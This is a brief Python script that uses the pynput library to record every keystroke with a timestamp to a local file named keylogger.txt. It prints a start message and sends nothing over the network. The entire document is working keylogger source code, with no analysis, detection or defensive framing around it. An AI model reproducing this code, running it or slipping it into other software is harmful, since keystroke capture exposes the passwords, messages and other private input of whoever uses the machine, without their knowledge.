from pynput.keyboard import Listener
import logging
import time

print('start logging')
wenjianweizhi = ""

logging.basicConfig(filename=(wenjianweizhi+"keylogger.txt"),format="%(asctime)s:%(message)s",level=logging.DEBUG)

def press(key):
    logging.info(key)

with Listener(on_press = press) as listener:
        listener.join()